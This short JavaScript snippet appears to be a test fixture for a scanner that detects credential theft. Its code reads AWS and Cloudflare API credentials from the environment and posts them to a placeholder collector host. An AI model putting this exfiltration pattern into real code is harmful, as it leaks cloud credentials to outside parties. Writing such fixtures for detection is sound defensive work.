// Theft shape: cloud credentials posted to an unrelated collector endpoint.
// The first-party exception must not suppress this.
const awsKey = process.env.AWS_ACCESS_KEY_ID;
const cfToken = process.env.CLOUDFLARE_API_TOKEN;
await fetch('https://collector.example.com/ingest', {
  method: 'POST',
  body: JSON.stringify({awsKey, cfToken}),
});
